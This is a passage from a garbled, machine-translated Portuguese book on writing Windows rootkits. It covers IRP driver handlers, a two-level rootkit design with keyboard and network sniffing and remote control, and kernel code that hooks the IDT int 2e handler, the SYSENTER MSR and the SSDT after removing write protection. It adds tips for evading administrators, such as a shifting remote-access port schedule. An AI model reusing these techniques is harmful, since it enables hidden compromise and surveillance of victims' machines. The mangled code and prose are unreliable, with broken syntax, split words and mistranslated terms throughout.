IRP (pacotes de solicitação de entrada/saída) - são pacotes de solicitação de entrada/saída, 
que o gerente de entrada/saída transfere o dispositivo para o driver quando
Um grama de nível de usuário é endereçado a este dispositivo.Para 
Interagir com o programa de nível de usuário, o driver
Os enxames (componente do nível do núcleo) devem ser capazes de processar pacotes IRP. 
135

pagina: 135

Rootkits 
Não há nada complicado aqui - essas são apenas as estruturas que contêm 
Boofers para transferência de armazenamento/dados. 
Para analogia, você pode dar um exemplo com uma gravação regular de arquivo.Programa 
Abre um arquivo.Em caso de abertura bem -sucedida, ela recebe um descritor 
O arquivo que ele usará nas operações de entrada/saída da FI
sucatear.Depois disso, o programa pode, por exemplo, escrever dados em um arquivo ou 
Leia os dados do arquivo. 
No nível do núcleo, a operação de gravação é percebida como IRP.Sugerir
BENCH PRETE QUE O componente do usuário registrou uma linha no descritor 
"Olá!Eu estou bem ".Então o componente do nível do núcleo receberá um buffer, 
contendo esta linha. 
Para processar cada IRP, o motorista deve registrar um especial
uma nova função do processador.A estrutura de driver_object tem uma matriz 
Maiorfunção de IRP_MJ_MAXIMUM_FUNCTLON Sinais, em atribuição 
cujos elementos são endereços dos manipuladores relevantes e são 
Seu registro (Fig. 5.3). 
Variedade 
Maiorfunção 
Programa de usuário 
\ 
1 
Escrever 
' 
) 
f 
! 
Ler 
" 
EU 
1 
oc 
Tl 
' 
EU 
Majorfunctionfo] 
Majorfum: ção [irp_mi_max ...] 
R 
O núcleo do sistema operacional 
Irp_handler 
Arroz.5.3.Processamento de pacotes de entrada/saída - opção simplificada 
Primeiro, mostraremos como nos registrar para todo o IRP o mesmo
Barco (chame de mylrphandler) - simplesmente para que você entenda o que 
A ideia consiste. 
136

pagina: 136

Capítulo 5. Escreva o primeiro driver 
Listagem 5.4.Registro do manipulador de IRP 
Ntstatus mylrphandler (em pdevice_object pdeviceObject, 
No PIRP PLRP) 
{ 
Dbgprint 
("Mylrphandler.
.
.
"
) 
; 
pirp-> iostatus.status = status_success; 
OclomEteraQuest (PLRP, io_no_increment); 
Retornar status_success; 
} 
NTSTATUS DriverEntry ( 
Em pdriver_object pdriverbject, 
Em punicode_string pregistryPath) 
{ 
int i; 
/* 
As linhas do código antes do registro da função Onunload são as mesmas. 
Como na Listagem 5.3 
*/ 
Pdriverobject-> driverUnload = OnUnload; 
para (1 = 0; irp_mj_maximum_function; i ++) 
( 
pdriverbject-> majorfunção [i] = mylrphandler; 
) 
/* 
Outras linhas de código são as mesmas da Listagem 5.3 
*/ 
A função mylrphandler é apenas um plugue, mas também deve ser
escrito pelas regras.Tendo concluído o processamento do IRP, o motorista é obrigado a chamar a diversão
Iocompleterequest, informando o despachante de entrada/conclusão que este 
O motorista terminou o processamento deste pacote.O despachante cheques, não registro
Se os fatores de um nível mais alto de seus procedimentos de íons iComplet foram acionados 
Para este IRP, executa -os e somente depois disso retorna o status 
Conclusão no programa do usuário. 
Olhe para a fig.5.3.O programa de usuário pergunta ao motorista que você
Preencha certas ações - Escreva, leia e IOCTL.Mas o motorista é um raver
Resolve todas as ações da mesma função.Errado?Certamente. 
Agora estamos considerando esse modelo de simplicidade para que você entenda, 
O que e como está acontecendo.Na prática, para cada ação, deveria haver 
sua própria função. 
Vamos implementar o modelo certo no qual para cada ação 
Uma função será realizada.Suponha que nosso motorista permita
pode executar as seguintes operações sobre o dispositivo: 
137

pagina: 137

Rootkits 
• 
Abra a função do dispositivo - OnCreate; 
• 
Feche a função do dispositivo - oClose; 
• 
Gravar dados na função do dispositivo - onreadwrite; 
• 
Leia a resposta do dispositivo - a função onReadWrite; 
• 
Controle geral de entrada/saída - função ONDEVICECONTROL. 
Então, em vez de registrar a função Mylrphandler, escrevemos as seguintes linhas: 
DriverObject-> majorFunction [irp_mj_create] = 
OnCreate; 
DriverObject-> MajorFunction [IRP_MJ_CLOSE] 
= OClose; 
DriverObject-> MajorFunction [IRP_MJ_READ] 
= OnreadWrite; 
DriverObject-> MajorFunction [IRP_MJ_WRITE] 
= OnreadWrite; 
DriverObject-> MajorFunction [IRP_MJ_DEVICE_CONTROL] 
= 
OnDeviceControl; 
Programa de usuário 
Variedade 
Maiorfunção 
Escrever 
Ler 
Loctl 
Rnyjocontrol 
My_read 
My_write 
Motorista 
O núcleo do sistema operacional 
My_io Control 
-»| 
My_write 
Arroz.5.4.Vários pacotes de IRP recebem manipuladores diferentes 
Todas as funções de processamento do IRP recebem os mesmos argumentos:
O acerto de contas para o dispositivo e o ponteiro para a estrutura do IRP.Vamos escrever auxiliares
Complete que completa o processamento de cada IRP 
(Listagem 5.5). 
138

pagina: 138

Capítulo 5. Escreva o primeiro driver
Listagem
5.5.Processadores
IRP
Ntstatus completeirp (pirp pirp, status ntstatus, informação ulong)
{
pirp-> iostatus.status = status;
// O número de bytes transferido para o cliente.
pirp-> iostatus.information = info;
OclomEteraQuest (PIRP, io_no_increment);
Status de retorno;
}
Ntstatus onCreate
(
Em pdevicejdbject pdo,
No PIRP PIRP)
{
Pio_stack_location plrpstack =
IOGETCURENTLRPSTACKLOCATION (PIRP)
;
Dbgprint
("OnCreate: filename = %ws",
&
(pirpstack-> fileObject-> fileename.buffer));
Retornar completeirp (pirp, status_success,
0);
}
Ntstatus onclose (em pdevice_object PDO,
No PIRP PIRP)
{
Dbgprint
("Onclose");
Retornar completeirp (PIRP, status_success, 0)
;
}
Ntstatus onreadwritet em pdevicejdbject pdo,
No PIRP PIRP)
{
ULONG BYTESTXD = 0;// Número de bytes transferidos
Status ntstatus = statusjSuccess;
Dbgprint ("onreadwrite");
Retornar completeirp (pirp, status, bytestxd);
)
A função OnDeviceControl será mais difícil porque daremos
Medidas de várias ações possíveis para controlar o dispositivo.Inicialmente
Determine os códigos de controle (Listagem 5.6).
Listagem 5.6.Controle de dispositivo IRP MJ
// exibe uma depuração
• Definir
IOCTL_PRINT_MESSAGE CTL_CODE
(\
File_Device_uunknown, 0x701, \
Method_buffhed, file_any_access)
// envia ao usuário um byte de nível um
• Definir ioctl_send_byte_to_user ctl_code (
\
File_Device_unknown, 0x702, \
Método Buffhed, Acesso ao arquivo)
1
3
9

pagina: 139

Rootkits 
// aborda diretamente a porta paralela em 378N 
#Define ioctl_toch_port_378h ctl_code (
\ 
File_device_uunknown, 0x703, \ 
Method_buffhed, file_any_access) 
Ntstatus ondeviceControl (em pdevicejdbject pdo, 
No PIRP IRP) 
{ 
Status ntstatus = status_success; 
ULONG BYTESTXD = 0;// Número de bytes transferidos 
Pio_stack_location plrpstack = ioGetCurrentLrpStacklock (PLRP); 
Pprimer_device_extension dx = 
(Pprimer_device_extension) PDO-> Devicextance; 
ULONG CONTROLCODE = 
pirpstack-> parameters.devicelocontrol.iocontrolCode; 
Método Ulong = ControlCode & 0x03; 
Dbgprint ("OnDeviceControl: ioctl %x.", ControlCode); 
Trocar 
( 
ControlCode) { 
Case ioctl_print_message: 
{ 
Dbgprint ("ioctl_print_message 
"); 
Quebrar; 
) 
Case ioctl_send_byte_to_user: 
( 
// Tamanho dos dados recebido do usuário: 
Ulong inputLength = 
pirpstack-> parameters.devicelocontrol.inputBufferLength; 
Ulong OutputLength = 
pirpstack-> parameters.devicelocontrol.utputBufferLength; 
se 
(OutputLengthKl) 
{ 
Status = status_invalid_parameter; 
Quebrar; 
} 
if (método == Method_buffhed) 
( 
buff = 
(PuChar) pirp-> AssociatedIrp.systemBuffer; 
Dbgprint ("Método: buffersed"); 
} 
Outro 
if (método == Method_Neither) 
{ 
buff = (char não assinado*) pirp-> userBuffer; 
Dbgprint ("Método: Neither"); 
} 
Outro 
{ 
Dbgprint 
("Método: não suportado"); 
140

pagina: 140

Capítulo 5. Escreva o primeiro driver
Status = status_invalid_device_request;
Quebrar;
1
Dbgprint
("Endereço buffer = %08x", buff);
*buff = 33;
Bytestxd = 1;
Quebrar;
)
Case ioctl_toch_port_37
8h:
{
Ecregister curto não assinado = 0x378+0x402;
Dbgprint
("IOCTL_TOUCH_PORT_378H.");
_asm {
MOV DX, Ecregister;
XOR AL, AL;
Fora DX, Al
;Instale o modo ERR 000
Mov al, 095h
;Bits 7: 5 = 100
Fora DX, Al
;Instale o modo Err 100
}
Quebrar;
}
Padrão:
Status = status_invalid_device_request;
}
Dbgprint ("OnDeviceControl: %d bytes escritos",
(int) bytestxd);
Return completeirp (PLRP, status, bytestxd);
}
5.7.Esquema de dois níveis rutkin
Você aprendeu a criar e registrar o driver do dispositivo e entendeu,
Como o programa de nível de usuário pode interagir com ele.
Obviamente, você pode escrever um rootkit, cujos componentes
Tali estaria em ambos os níveis.Por exemplo, um componente do usuário poderia
executar a maioria das funções - interação de rede, remoto
gestão, etc. e o componente do núcleo seria de baixo nível, puramente
"Nuclear", funções - acesso a "ferro" e cobrindo as atividades de Paul
componente chamando.
O esquema de interação dos componentes de dois níveis (às vezes chamados
O Rutkit de dois níveis (Fusion Rootkit)) é mostrado na FIG.5.5.
Neste esquema, o componente do núcleo modificará a guia
Pessoas de núcleos, bem como teclado e pacotes de núcleo transmitidos pela rede
(Sniffing - espionagem, interceptação).Componente do usuário
141

pagina: 141

Rootkits 
funcionará "sob a cobertura" do componente do nível do núcleo.Seus principais 
funções são o fornecimento de acesso remoto (ou simplesmente possível
Controle remotamente o computador - execute operações com FI
Sistema de amor, desligue/reinicie o carro, execute programas 
etc.). 
Interação com o usuário 
componente e componente do nível 
Núcleos 
Líquido 
Oculto pelo componente do núcleo 
Componente do usuário 
O núcleo do sistema operacional 
Modificação 
O componente do nível do núcleo 
Fungando 
pacotes 
Fungando 
Teclado 
Arroz.5.5.Two -Level Rootkit 
O uso de um esquema de dois níveis tem as seguintes vantagens: 
• 
Ações no nível do usuário envolvem o uso de 
Funções da biblioteca do Windows - as mesmas funções para trabalhar com 
rede.Não reescreva todas as janelas novamente?Todo mundo sabe, 
que as funções da biblioteca do Windows podem conter erros.Então 
Por que incluir código de erro no núcleo Rutkin?Afinal, para 
Rutkit não foi notado, o sistema deve funcionar de forma estável - para que 
Nada lembrou a presença de Rutkin. 
• 
Se o componente do usuário ainda estiver "calculado" e 
removido pelo administrador, então o componente do núcleo ainda permanecerá em 
o sistema e poderão interceptar pacotes e "ouvir" o teclado
Percorrer.O administrador vai pensar que está tudo bem - ele está 
Rutkit removido. 
Para a interação do componente do usuário e o componente do nível
Os núcleos NYE ​​podem ser usados ​​de várias maneiras.Geralmente usado 
Equipes ioctl (controle de E/S).Os comandos do IOCTL são 
142

pagina: 142

Capítulo 5. Escreva o primeiro driver 
Mensagem determinada pelo programador.Cada mensagem carrega 
um certo comando, por exemplo, o comando para estabelecer uma conexão com o
Em seguida, um nó ou abra uma porta para acesso remoto.Você pode fazer 
O cronograma da porta “flutuante” para acesso remoto.Por exemplo, em 
No primeiro dia em que o porto abre 30 minutos após o lançamento do sistema, em 
o segundo - em uma hora, para o terceiro - após 40 minutos, etc., então será mais difícil 
Calcule seu rootkit. 
E, completando o tema das ferramentas do desenvolvedor Rutkita, digamos algumas palavras sobre 
A estrutura do projeto Rutkita.Eu recomendo não manter todos os arquivos de origem 
em um catálogo e crie a estrutura dos catálogos para Rutkita - você mais tarde 
Será mais fácil navegar em tudo isso.Por exemplo, como imagem
esposas na fig.5.6. 
Eu tenho uma árvore de catálogos 
] Hmy rootk.it 
BIN 
-incluir 
Lib 
Tique 
• Bota 
-file_hkle 
-Netwoik 
-pioc_hide 
-ieg_hide 
• mysql 
-Banco 
Dados 
L -ATIS 
L-Wisconsin 
Limites 
Loutput 
Q | 
My_cooucit 
Pesquisa rápida: 
Zl 
OK 
Cancelamento 
F2 • Atualize uma árvore 
Selo... 
Referência 
Arroz.5.6.A estrutura dos catálogos para o projeto Rutkita 
O catálogo "raiz" do nosso projeto será my_rootkit.Na lixeira do catálogo 
Guaremos os módulos Rutkin compilados.No catálogo 
Incluir - arquivos de cabeçalho, se necessário. 
O catálogo L i B armazenará tudo o necessário para a compilação do projeto 
Bibliotecas e o catálogo SRC é o código -fonte do rootkit.Por conveniência, eu criei em 
Este catálogo é mais cinco supostos: 
143

pagina: 143

Rootkits 
• 
Boot - o código -fonte do programa -loader do rutkit; 
• 
FILE_HIDE - O código -fonte do programa para ocultar arquivos; 
• 
Rede - tudo relacionado à rede; 
• 
Proc_hide - um programa para ocultar processos; 
• 
Reg_hide - um programa para ocultar as seções do registro. 
No próximo capítulo, iniciaremos uma conversa sobre como esconder 
Arquivos, processos e seções de registro. 
144

pagina: 144

Capítulo 6. Intercepção no nível 
Núcleos 
• 
Interceptação de intercessão (tabela) 
• 
Instrução de Syssenter 
• 
Processos de fechamento (tabela SSDT) 
• 
Ocultação de conexão (tabela IRP) 
• 
Drivers de vários níveis 
Rootkits 
• • 
•

pagina: 145

No capítulo 4, conversamos sobre as tabelas do sistema - a tabela de interrupção do IDT e 
Tabela de Serviços do Sistema SSDT e, no Capítulo 5, introduziu o conceito de pacotes de entrada/ 
Saída IRP.Tudo isso pode ser interceptado e agora mostraremos como. 
Primeiro, demonstraremos a saída do conteúdo da tabela prometida no parágrafo 4.5 
Idt.Vamos exibir a janela do utilitário de depuração 
Visualização usando uma função 
Dbgprint.Adicione este código à função Drivertry (Listagem 6.1). 
Para ler a tabela IDT é a instrução SIDT.Ela retorna o endereço 
IDTINFO Estruturas: 
Typedef 
S t r u c t 
_Idtinfo 
{ 
Não assinado s h o r t 
Idtlimit; 
Não assinado s h o r t lowidtbase; 
Não assinado s h o r t 
Hildtbase; 
} Idtinfo; 
O endereço do próprio IDT é retornado nos campos da estrutura da LowidtBase e HildtBase. 
Para converter esses campos em endereço completo, determinamos a macro tolong: 
#Define Tolong 
(a, 
b) ((longo) (((Word) (a)) | 
\ 
((DWord) ((word) (b)) "1 b)) 
Cada registro IDT é uma estrutura do idtentry tipo 64 
Pedaço.A gravação da tabela IDT contém informações sobre a função de processamento 
Interrupções: 
#Pragma 
P a c k (l) 
Typedef struct _idTentry 
( 
UNSIGNED LEWFOFFSET DE LOUTA; 
Seletor curto não assinado; 
146

pagina: 146

Capítulo 
6. Revival 
sobre 
nível 
Núcleos 
Char não assinado unus_lo; 
Char não assinado unus_hi: 5; 
Char não assinado dpl: 2; 
Char não assinado P: L;// bit da presença do vetor de interrupção 
HiOffset curto não assinado; 
Idtentry; 
Zagta Pack () 
Listagem 6.1.Saída do conteúdo de IDT 
• Inclua <ntddk.h> 
#Define Tolong (a, b) ( 
(LONGO) 
(
( 
(Curto não assinado) 
(a)) | 
\ 
((Longo não assinado) 
((Curto não assinado) 
(b))) << 16)) 
Typedef struct _idtinfo 
{ 
Idtlimit curto não assinado; 
Não assinado curto lowidtbase; 
Hildtbase curta não assinada; 
} Idtinfo; 
• 
Definir max_idt_entries 25 
6 
• PAGMA PACK (L) 
Typedef struct _idTentry 
( 
UNSIGNED LEWFOFFSET DE LOUTA; 
Seletor curto não assinado; 
Char não assinado unus_lo; 
Char não assinado unus_hi: 5; 
Char não assinado dpl: 2; 
Char não assinado P: L;// bit da presença do vetor de interrupção 
HiOffset curto não assinado; 
) Idtentry; 
• PAGMA PACK () 
Ntstatus driverEntry (em pdriver_object pdriverobject, 
Em punicode_string pregpath) 
( 
Idtinfo idt_info;// Variável de armazenamento IDT 
Idtentry* idt_entries;// Indicador para gravar a tabela IDT 
Long K não assinado;// contador 
// Download IDT 
ASM { 
SIDT idt_info; 
) 
Idt_entries = (idtentry*) tolong (idt_info.lowidtbase, 
idt_info.hildtbase); 
para (
k = 0;k <max_idt_entries;k ++) 
{ 
char _s [255]; 
Idtentry * 
I = entradas SIDT [k]; 
147

pagina: 147

Rootkits 
Addr longo não assinado = 0; 
Addr = Tolong (i-> lowoff, i-> hiOffset); 
_snprintf (_s, 253, "INTA %d: vetor 0x %08x", k, addr); 
Dbgprint (_s); 
} 
Retornar status_success; 
} 
6.1.Interceptação de intercessão (tabela IDT) 
A tabela IDT (tabela de descritor de interrupção) é usada para controlar 
interrupções.Sabemos que as interrupções são hardware 
(IRQ - Solicitação de interrupção) ou software (interrupção).Aparelho
As interrupções são iniciadas por "ferro" e software - software 
provisão.IDT contém informações sobre interrupções de software -
Aqueles que são iniciados pelas instruções int <número de_flies>.Nós 
Nem todas as interrupções estão interessadas, mas apenas uma única - int 2e.Dan
A interrupção é usada para realizar uma chamada do sistema. 
Vamos lembrar como a chamada do sistema é realizada.Pôster no eax
A função da função (chamada do sistema) é, no edx - os parâmetros da função, 
E então uma interrupção do 2E é chamada.Podemos criar uma armadilha que 
Eu interceptaria essa interrupção.É claro que a armadilha (falando técnica 
O idioma - o processador de interrupção) será causado antes da função da API. 
O processador de interrupção inicial 2E funciona algo assim: por número 
As funções (EAX Register) encontram o endereço da função desejada na tabela SSDT. 
Então ele verifica se os parâmetros especificados no EDX correspondem à informação
As correspondências contidas na tabela SSPT.Se tudo estiver bem, então causa 
Função da API. 
Como nosso manipulador funcionará?Você provavelmente já mentalmente 
"Desenhe" um esquema de seu funcionamento: ele fará o mesmo, 
Mas com a filtragem do resultado.Eu devo te chatear.Manipulador de interrupção
Nia é uma função "final -to -end", para que nunca receberá gerenciamento 
Depois de concluir a implementação da função da API.Isso significa que ele não é 
será capaz de filtrar o resultado. 
No entanto, Rutkit pode tentar identificar o aplicativo que
Roy iniciou uma chamada de sistema.Então, você pode tentar encontrar 
firewall ou quadris instalados.Mas vamos falar sobre isso um pouco mais tarde. 
Dizia -se que no EAH há um número de chamada do sistema, e em EDX -
parâmetros, mais precisamente o ponteiro para os parâmetros, e os próprios parâmetros são colocados 
Na aplicação de vidro.Quem preenche os registros da EAX e 
148

pagina: 148

Capítulo 6. Revival no nível do núcleo 
EDX e chama int 2e?O culpado de tudo isso é ntdll.dll. 
Verdadeiro, nas versões mais recentes do Windows ntdll.dll usa o resumo
Sysenter (será descrito abaixo) e não interrupção de int 2e. 
Substituímos as linhas que exibiram os endereços atuais do verto na janela de depuração
um fosso de interrupções, para chamar a função Hook_Idt (Listagem 6.2).Esta função 
Conjunto em vez de um processador de interrupção padrão Kisystemervice 
NAOI O próprio manipulador - Mykss Function.A função usa 
As seguintes variáveis ​​globais: 
• 
OldKisystemService - o endereço deste manipulador de interrupção
int 2 e; 
• 
INT2E - Número de interrupção (no nosso caso 0x2e, mas você é semelhante
você pode interceptar qualquer interrupção). 
Ação reversa, isto é, a restauração do manipulador inicial, execução
A função está desocupada. 
Listagem 6.2.Interrupção Interceptor 0 x 2 e 
Não assinado Longo OldKisystemService; 
#Define Int2e 0x2e 
DeclSpec (nu) myks () 
( 
ASM { 
Pushad 
Pushhf 
D. 
Empurre fs 
MOV BX, 0x30 
mov fs, bx 
Empurre ds 
Empurrar es 
// Aqui você precisa inserir o processo de detecção do processo 
// e prevenindo 
// ações.O ponteiro para o processo de eProcess atual pode 
// Compra PSGetCurrentProcess 
// terminar: 
Pop es 
Pop ds 
Pop f 
S. 
POPF 
D. 
Popad 
// Ligue para o manipulador original 
JMP OldKisystemService; 
Voeid Hook Idt () 
149

pagina: 149

Rootkits
{
Idtinfo idt_info;
Idtentry* i d t _ e n t r i e s,
*int2e_entry;
você
eu
O
N
G idt_count, idt_addr;
Dbgprint ("inserir hook_idt");
ASM {
SIDT idt_info;
}
idt_entries = (idtentry*) tolong (idt_infо.lowidtbase,
idt_info.hiidtbase);
OldKisystemService =
Tolong (idt_entries [int2e] .lowoffset,
idt_entries [int2e] .hioffset);
int2e_entry = & (idt_entries [int2e])
;
Dbgprint ("Hook_idt Oldks 0x%08x,
Myks 0x%08x ", OldKisystemservice, myks);
ASM {
CLI;
Lea Eax, Myks;
mov ebx,
int2e_entry;
mov [ebx], machado;
shr eax, 16
mov [ebx+6], machado;
eu i d t
idt_info;
s t i;
)
Dbgprint ("Hook_idt myks 0x%08x",
Tolong (idt_entries [int2e] .lowoffset, eu
d t _ e n t r i s [i n t 2 e].H i o f s e t);
Dbgprint ("Exiting Hook_idt");
}
Void desarbatê -lo (
)
{
IDTINFO INFO;
Idtentry* entradas;
Idtentry* int2e;
ULONG IDT_ADDR;
Dbgprint ("entrando dessocok_idt");
ASM {
Informações SIDT;
}
entradas = (idtentry*) Tolong
(Info
info.hildtbase);
int2e = &
(entradas
[Int2e]);
ASM (
CLI;
MOV EAX, OldKisystemService;
mov ebx,
int2e;
.Lowidtbase,
150

pagina: 150

Capítulo 6. Revival no nível do núcleo 
mov [ebx], ah; 
Shr eax, 16 
mov [ebx+6], ah; 
Info Lidt; 
DST; 
} 
Dbgprint ("saindo de não 
; 
6
.
2
. 
Instruções 
Sysenter 
Versões recentes do Windows, em vez de interrupção, int 2e usam um
TROCAÇÃO SYSSENTER.NTDLL carrega um número de chamada do sistema na EAC, em 
O EDX é o ponteiro da pilha atual (ESP) e depois chama Sysenter.Como 
Veja bem, nada mudou, exceto a última instrução.Instruções 
Sysenter transfere o gerenciamento para o endereço indicado no registro MSR 
(Registro específico do modelo) IA32_SYSENTER_EIP. 
Agora vamos escrever um pequeno motorista que grava no registro 
Ia32_sySenter_eip O endereço de nossa armadilha é uma função que será sobre
RET as instruções do SySenter.O motorista salva o endereço do original 
Processador de interrupção na variável Orig_sySenter.Função trap 
Simplesmente transfere o gerenciamento da função original. 
Listagem 6.3.Intercepção das instruções do Sysenter 
#include "ntddk.h" 
ULONG ORIG_SYSENTER;// Endereço do Sysenter do processador de origem 
// armadilha 
_Declspec (nu) my_sySenter () 
{ 
ASM { 
JMP [orig_sysente] 
Ntstatus driverEntry (em pdriver_object pdriverobject, 
Em punicode string pregpath) 
/* 
Código comum 
Inicialização do motorista ... 
*/ 
ASM { 
MOV ECX, 0x176 
;Lemos o valor do registro IA32_SYSENTER_EIP 
Rdmsr 
Mov orig_sysenter, eax 
151

pagina: 151

Rootkits 
;O endereço da armadilha 
mov eax, my_sysenter 
;Registre em IA32_SySenteR_EIP 
Wrmsr 
) 
Retornar status_success; 
) 
O mais interessante é que a interceptação das instruções do sysente é ainda mais fácil do que o bigode
TNOVKA TRAP PARA IDT.Eu disse que a Microsoft faz todo o possível
Noe, para facilitar o trabalho dos desenvolvedores de Rutkin para nós. 
6.3.Processos de fechamento (tabela SSDT) 
Como já observado, o Windows fornece acesso a seus três subsis
Tópicos: Win32, Posix e OS/2.Endereços de serviços do sistema desses sistemas 
Armazenado na tabela SSDT (tabela de expedição de serviço do sistema) - Tabela 
Serviços de sistema.Para ser extremamente preciso, então nesta tabela
Números de chamadas do sistema e os endereços correspondentes dos endereços da API-FUN são
KNII.O núcleo também funciona com outra tabela - SSPT (serviço do sistema 
Tabela de parâmetros) - Uma tabela de parâmetros dos serviços do sistema.Nesta tabela 
Os parâmetros dos serviços do sistema são descritos. 
O núcleo é exportado pela tabela KeServiedescriptIltable.Esta guia
A pessoa contém sinais de parte da tabela SSDT e na tabela SSPT 
A parte exportada da tabela SSDT contém o principal sistema SERS
Os vistos implementados no Ntoskrnl.EHE - A parte principal do núcleo. 
Para a implementação da chamada do sistema, o sistema de sistêmico 
Serviços - KisystemService.Ele é simplesmente por um número de chamada do sistema em
Ande na tabela SSDT seu endereço.Deve -se notar que todos os endereços no SSDT 
-32 bits (4 bytes).Você também precisa se lembrar disso para 
Um ID de chamada de sistema específico encontra seu endereço no SSDT, você precisa de um número 
Multiplique por 4 - então obtemos um deslocamento no SSDT 
A tabela KeServiedescriptItable KeservieDescriptable contém uma papoula
Número simal de serviços no SSDT, isso é necessário para calcular 
deslocamentos em SSDT e SSPT 
A tabela SSPT contém informações sobre os parâmetros das chamadas do sistema. 
Cada elemento desta tabela ocupa um byte - ele contém
O histórico pessoal dos parâmetros para uma chamada de sistema específica.Sobre 
arroz.6.1 mostra as tabelas SSDT (acima) e SSPT (abaixo). 
152

pagina: 152

Capítulo 6. Revival no nível do núcleo
804AB3BF
804AE86V
804bdef3
8050V034
18 20 2S2S
• 40 ...
Arroz.6.1.Tabelas SSDT (acima) e SSPT (abaixo)
De acordo com a FIG.6.1, a função em 804e86V aceita 0x20 (32) byte
parâmetros.
Além do KeServiedescriptIctable Keserviedescriptostable, outro é usado
Tabela - KeServicedEScriptLeshadow Contendo endereços de serviço
As corujas USR e GDI implementadas no motorista do núcleo de 32 K.Sys.Essa mesa
Não vamos considerar se você estiver interessado, você pode ler sobre isso
Na internet - basta entrar "KeserviedescriptableShadow" em qualquer
Você receberá tantos links que não revisará tantos links.
O gerenciador de chamadas do sistema é ativado pela interrupção de int 2e ou imposto
SYSSENTER CORPORATION.O aplicativo pode causar um despacho.
diretamente ou use um dos subsistemas, como o Win32.Na seração
O chá do Win32 será fabricado pela NTDLL.DLL, que será colocado no número da EAC
Chamada de sistema (que é necessária para o aplicativo) e no EDX será gravado
Parâmetros de chamada do sistema KisystemService Dispatcher vai verificar
os parâmetros do número de funções indicadas nos EACs e no caso de conformidade
Inicie a função necessária.
Rutkin, carregado na forma de um driver de dispositivo, pode alterar o endereço
Funções na tabela SSDT.Você já está familiarizado com a técnica, só agora estamos
Vamos no nível do núcleo.Rutkin lembra o endereço da função original em seu
Ela é a tabela interna e, no SSDT, ela escreve o endereço de sua própria função.
O sistema desafia o gerente, sem suspeitar de nada, desencadeia a função
Rutkin, que executa algumas ações, depois lança o inicial
Função (seu endereço Rutkit é ziado), então, tendo recebido seu resultado, está enraizado
Modifica e transfere para o aplicativo.
6.3.1.Proteção à mesa SSDT e Rutkin
Lembre -se, dissemos que o Windows XP e as versões posteriores podem
Proteja as tabelas SSDT e IDT, disponibilizando -as apenas para leitura
153

pagina: 153

Rootkits
(Cláusula 4.7)?Para ativar essa proteção, você precisa modificar algumas chaves
Registro.Claro, poucos administradores sabem sobre eles, mas você precisa de Orien
Suave para o pior - em um administrador qualificado.
Se as tabelas SSDT e IDT estiverem protegidas da gravação, mude sua raiz
será capaz.Quando você tenta escrever em uma área protegida de memória, todos aparecerão
Estamos familiarizados com a tela azul, indicando que
Erro crítico do sistema e você não pode mais continuar funcionando.Todos.
O sistema está parado.
Mas não é tão ruim assim.Ele não será capaz de alterá -los até que sejam defendidos
nós da gravação.Também não podemos abrir a porta, enquanto ela está fechada com uma chave.
Mas se você conseguir abrir a fechadura com alguma coisa, abra a própria porta - não
problema.No nosso caso, você precisa tentar desativar a proteção contra
Registros.Pode ser feito.E em geral, lembro -me de uma frase (não
Nude, que disse): “Tudo está quebrando.Aqui estão apenas para diferentes momentos e com diferentes
barulho. "Lembre -se disso e tente reduzir o tempo e o nível de "ruído" ...
Se você leu cuidadosamente o capítulo 4, deve saber que se modif
CYCE O registro de controle do CR0, você pode desativar a proteção de gravação.Mas
Este método é bastante bárbaro.Neste parágrafo, consideraremos outro Spo
SOB, implementado pela Microsoft (parece que a Microsoft
Cria -os de propósito).
Você pode descrever a região de memória na lista do descritor de memória (MDL,
Lista de descritores de memória).O elemento de lista MDL contém o endereço inicial,
O processo do proprietário, o número de bytes e bandeiras instaladas para a região PA
Stry.
// estrutura _mdl, bem como algumas bandeiras (constantes)
// (retirado de ntddk.h)
Typedef struct _mdl {
Estrutura _mdl *a seguir;
Tamanho do cshort;
Cshort mdlflags;
Processo de estrutura _eprocess *;
Pvoid ​​mapeedsystemva;
Pvoid ​​startva;
Ulong Bytecount;
Ulong Byteoffset;
} Mdl, *pmdl;
// mdl-flagi
#define mdl_mapp_to_system_va
0x0001
#Define mdl_pages_locked
0x0002
#define mdl_source_is_nonpage_pool
0x0004
#Define mdl_allocated_fixed_size
0x0008
#Define MDL parcial
0x0010
154

pagina: 154

Capítulo 6. Revival no nível do núcleo 
• Definir 
#definir 
#definir 
• Definir 
# Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
Mdl_ 
Mdl_ 
Mdl_ 
Mdl_ 
Mdl 
Mdl 
Mdl 
Mdl_ 
Mdl_ 
Mdl 
Parcial tem sido 
10 páginas de leitura 
_ Operação de escrita 
MAPPEP 
Sytem mapeado para pais 
_Lock_held 
_Physical_view 
10 espaço 
_Network_header 
_Mapping pode faixar 
_Va 
Alocado deve ter sucesso 
EU 
0x0040 
0x0080 
0x0100 
0x0400 
0x0800 
0x1000 
0x4000 
0x0020 
0x0200 
0x2000 
O que precisa ser feito, você provavelmente já adivinhou.O endereço inicial 
Você precisa instalar no início da tabela SSDT e depois usar sinalizadores 
Altere os parâmetros desta região de memória, inclusive para remover a proteção 
Da gravação. 
Você pode criar uma região de memória usando a chamada MMCreateMDL.Esse 
A chamada do sistema permite que você indique o início da região e seu tamanho.POS
LE isto você deve definir o sinalizador mdl_mapped_to_system_va para 
permissão para registrar nesta região.Tudo, o assunto foi feito!Um exemplo do código é apresentado em 
Listagem 6.4. 
Listagem 6.4.Desconectando a proteção da região da memória 
• Inclua "ntddk.h" 
• PAGMA PACK (L) 
Typedef serviceedescriptorentry { 
Não assinado int *serviceTableBase; 
Não assinado int *serviceCountbleBase; 
Não assinado int numberOfServices; 
CHAR não assinado *ParametableBase; 
} SeredEscriptEfLabLentry_t; 
• 
Pack Pragma 
() 
DeclSpec (Dllimport) 
ServiceScriptabLENTRY_T KeServiceEscriptIctable; 
PMDL PsystemCall; 
Pvoid*mapedSystemCaltable; 
PsystemCall = Mncreatemdl (null, 
KeServieDescriptable.ServiceTableBase, 
KeServieDescriptable.NumberOfServices*4); 
se 
(! 
MMbuildMdlForNonPagedPool (PsystemCall); 
psystemCall-> mdlflags = 
PsystemCall-> mdlflags i mdl_mapped_to_system_va; 
MapedSystemCaltLable = 
MmmmaplockedPages (PsystemCall, Kernelmode); 
155

pagina: 155

Rootkits 
6.3.2.Alterar SSDT 
Agora que o SSDT está disponível para gravação, podemos alterá -lo.Lembrar 
Dissemos que há uma API no nível do usuário - seus nomes 
Comece em "NT" - e há uma API do nível do núcleo com nomes que começam 
Do prefixo "ZW".2 \ y*-funções são usadas pelos componentes do núcleo e unidades
Belines de dispositivos. 
